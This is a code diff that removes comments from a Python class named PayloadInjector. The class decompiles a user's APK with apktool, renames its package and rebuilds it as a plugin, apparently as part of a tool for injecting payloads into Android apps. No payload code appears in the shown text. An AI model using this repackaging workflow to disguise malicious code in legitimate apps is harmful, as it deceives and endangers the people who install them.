@@ -186,7 +186,6 @@ class PayloadInjector:
             import tempfile
 
             analyzer = APKAnalyzer(user_apk_path)
-            # Create unique analyze directory for each request
             timestamp = int(time.time() * 1000)
             analyze_dir = tempfile.mkdtemp(prefix=f'analyze_{timestamp}_')
 
@@ -197,7 +196,6 @@ class PayloadInjector:
 
             icon_path = None
             if results.get('icon_path') and os.path.exists(results['icon_path']):
-                # Use unique filename to avoid conflicts in concurrent requests
                 icon_filename = os.path.basename(results['icon_path'])
                 unique_icon_name = f"icon_{timestamp}_{icon_filename}"
                 icon_path = os.path.join(self.work_dir, unique_icon_name)
@@ -211,7 +209,6 @@ class PayloadInjector:
                 'icon_path': icon_path
             }
 
-            # Clean up analyze directory
             try:
                 shutil.rmtree(analyze_dir, ignore_errors=True)
                 logger.debug(f"Cleaned analyze dir: {analyze_dir}")
@@ -248,7 +245,6 @@ class PayloadInjector:
             logger.info(f"Original: {original_package}")
             logger.info(f"New: {new_package}")
             
-            # Decompile user APK
             logger.info("Decompiling user APK...")
             process = await asyncio.create_subprocess_exec(
                 'java', '-jar', str(APKTOOL_PATH),
@@ -265,13 +261,11 @@ class PayloadInjector:
                 logger.warning("Using original APK without package change")
                 current_apk = user_apk_path
             else:
-                # Change package name in AndroidManifest.xml
                 manifest_path = os.path.join(temp_decompiled, 'AndroidManifest.xml')
                 if os.path.exists(manifest_path):
                     with open(manifest_path, 'r', encoding='utf-8') as f:
                         manifest_content = f.read()
                     
-                    # Replace package name
                     manifest_content = re.sub(
                         r'package="' + re.escape(original_package) + r'"',
                         f'package="{new_package}"',
@@ -283,7 +277,6 @@ class PayloadInjector:
                     
                     logger.info(f"✅ Package changed to: {new_package}")
                     
-                    # Rebuild APK
                     logger.info("Rebuilding plugin APK...")
                     process = await asyncio.create_subprocess_exec(
                         'java', '-jar', str(APKTOOL_PATH),
@@ -301,7 +294,6 @@ class PayloadInjector:
                         logger.info("✅ Plugin rebuilt with new package")
                         current_apk = temp_recompiled
                         
-                        # Cleanup decompiled directory
                         try:
                             shutil.rmtree(temp_decompiled, ignore_errors=True)
                         except:
